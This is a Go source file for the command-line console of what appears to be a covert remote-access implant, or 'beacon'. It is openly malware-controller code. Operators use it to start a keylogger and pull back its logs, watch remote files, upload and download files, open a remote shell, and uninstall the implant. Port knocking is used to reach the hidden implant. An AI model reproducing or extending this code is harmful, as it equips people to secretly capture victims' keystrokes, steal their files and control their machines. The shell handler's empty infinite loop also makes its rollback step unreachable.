package beacon

import (
    "bufio"
    "fmt"
    "os"
    "strings"
    "github.com/fatih/color"
    "strconv"
    "time"
)

type UserSelection struct{
    Code        uint8 
    LocalPath   string
    RemotePath  string
}

var (
	prompt = color.New(color.FgBlue, color.Bold)
    info = color.New(color.FgCyan)
    errColor = color.New(color.FgRed)
    optionName = color.New(color.FgBlue, color.Bold)
    optionNum = color.New(color.FgGreen, color.Bold)
    border = color.New(color.FgGreen, color.Italic)
)

func startInodeWatchCode(ch chan UserSelection){
    prompt.Print("Remote Inode Path» ")
    reader := bufio.NewReader(os.Stdin)
    remotePath, err := reader.ReadString('\n')
    if err != nil {
        errColor.Println(err)
        return
    }
    prompt.Print("Local Save Location» ")
    localPath, err := reader.ReadString('\n')
    if err != nil {
        errColor.Println(err)
        return
    }
    ch <- UserSelection{
        Code: StartInodeWatchCode,
        LocalPath: localPath, 
        RemotePath: remotePath,
    }
    prompt.Print("Press to Stop» ")
    _, _ = reader.ReadString('\n')
    ch <- UserSelection{
        Code: RollbackCode,
    } 
}

func startKeyLoggerCode(ch chan UserSelection){
    ch <- UserSelection{
        Code: StartKeyLoggerCode,
    }
    prompt.Print("Press to Stop» ")
    reader := bufio.NewReader(os.Stdin)
    _, _ = reader.ReadString('\n')
    ch <- UserSelection{
        Code: RollbackCode,
    } 
}

func uninstallCode(ch chan UserSelection){
    ch <- UserSelection{
        Code: UninstallCode,
    }
}

func discCode(ch chan UserSelection){
    ch <- UserSelection{
        Code: DiscCode,
    }
}

func transferKeylogCode(ch chan UserSelection){
    prompt.Print("Local Save Location» ")
    reader := bufio.NewReader(os.Stdin)
    localPath, err := reader.ReadString('\n')
    if err != nil {
        errColor.Println(err)
        return
    }
    ch <- UserSelection{
        Code: TransferKeylogCode,
        LocalPath: localPath, 
    }
}

func sendFileCode(ch chan UserSelection){
    prompt.Print("Local File Path» ")
    reader := bufio.NewReader(os.Stdin)
    localPath, err := reader.ReadString('\n')
    if err != nil {
        errColor.Println(err)
        return
    }
    prompt.Print("Remote Save Location Path» ")
    remotePath, err := reader.ReadString('\n')
    if err != nil {
        errColor.Println(err)
        return
    }
    ch <- UserSelection{
        Code: SendFileCode,
        LocalPath: localPath, 
        RemotePath: remotePath,
    }
}

func recvFileCode(ch chan UserSelection){
    prompt.Print("Remote File Path» ")
    reader := bufio.NewReader(os.Stdin)
    remotePath, err := reader.ReadString('\n')
    if err != nil {
        errColor.Println(err)
        return
    }
    prompt.Print("Local Save Path» ")
    localPath, err := reader.ReadString('\n')
    if err != nil {
        errColor.Println(err)
        return
    }
    ch <- UserSelection{
        Code: RecvFileCode,
        LocalPath: localPath,
        RemotePath: remotePath, 
    }
}

func runShellCode(ch chan UserSelection){
    ch <- UserSelection{
        Code: RunShellCode,
    } 
    for{
        // scan for CTRL+C here 
    }
    ch <- UserSelection{
        Code: RollbackCode,
    }
}

func rollbackCode(ch chan UserSelection){
    ch <- UserSelection{
        Code: RollbackCode,
    }
}

func portKnock(cmd string, commanderParams CommanderParamsStruct) bool{
    if cmd == "n" || cmd == "knock"{
        info.Println("Starting Porck Knocking...")
        SendKnock(commanderParams.Route, PortSequence)
        return true
    }
    return false 
}

func helpOption(cmd string) bool{
    if cmd == "help" || cmd == "h"{
        maxOptionNameLen := 0 
        for i := uint8(0); i <= uint8(9); i++{ 
            if maxOptionNameLen < len(CodeStrToCodeNum[i]){
                maxOptionNameLen = len(CodeStrToCodeNum[i])
            }
        } 
        border.Printf("    %*s\n", maxOptionNameLen, "Code Names Followed By Codes Numbers")
        for i := uint8(MinCode); i <= uint8(MaxVisibleCode); i++{ 
            padCount := maxOptionNameLen - len(CodeStrToCodeNum[i])
            if padCount < 0{
                padCount = padCount * -1
            }
            border.Printf("|")
            optionName.Printf(" %s" + strings.Repeat(" ", padCount) + "\t\t", CodeStrToCodeNum[i]) 
            optionNum.Printf("%2d", i)
            border.Printf("|")
            fmt.Printf("\n")
        }
        optionNum.Println("Enter clear or c to clear screen.")
        optionNum.Println("Enter help or h to print this help screen.")
        optionNum.Println("Enter flush or f to flush stale inbound packets.")
        return true
    }
    return false
}

func clearOption(cmd string) bool{
    if cmd == "clear" || cmd == "c"{
        fmt.Print("\033[H\033[2J")
        return true
    }
    return false
}

func flushOption(cmd string, commanderParams CommanderParamsStruct) bool{
    if cmd == "flush" || cmd == "f"{
        innerloop: 
        for {
            select {
            case _ = <-commanderParams.ReceiverResponseCh:
                fmt.Println("Discarding stale packet...")
            case <-time.After(3 * time.Second):
                break innerloop
            }
        }
        return true
    }
    return false
}

func parseCodeSelection(cmd string, ch chan UserSelection) bool{
    cmdNum, err := strconv.Atoi(cmd)
    if err != nil{
        errColor.Println(cmd, "is not a valid integer")
        return false
    } 
    if cmdNum < int(MinCode) || cmdNum > int(MaxVisibleCode){ 
        errColor.Printf("%s is not a valid code number. Valid code numbers range [%d-%d]\n", cmd, MinCode, MaxVisibleCode)
        return false
    }
    info.Printf("%s:%d code selected\n", CodeStrToCodeNum[uint8(cmdNum)], cmdNum)
    code := uint8(cmdNum)

    if code == StartInodeWatchCode{
        startInodeWatchCode(ch)
    }  else if code == StartKeyLoggerCode{
        startKeyLoggerCode(ch)
    } else if code == UninstallCode{
        uninstallCode(ch)
    } else if code == DiscCode{
        discCode(ch)
    } else if code == TransferKeylogCode{
        transferKeylogCode(ch)
    } else if code == SendFileCode{
        sendFileCode(ch)
    } else if code == RecvFileCode{
        recvFileCode(ch)
    } else if code == RunShellCode{
        runShellCode(ch)
    } else if code == RollbackCode{
        rollbackCode(ch)
    }
    return true 
}

func Cli(commanderParams CommanderParamsStruct){ 
	reader := bufio.NewReader(os.Stdin)
	for {
		prompt.Print("» ")
		line, err := reader.ReadString('\n')
		if err != nil {
            errColor.Println(err)
            return
        }
		cmd := strings.TrimSpace(line)
        if helpOption(cmd) || clearOption(cmd) || portKnock(cmd, commanderParams) ||
         flushOption(cmd, commanderParams){
            continue
        }
        parseCodeSelection(cmd, commanderParams.UserSelectionCh)
        time.Sleep(time.Second) 
	}
}



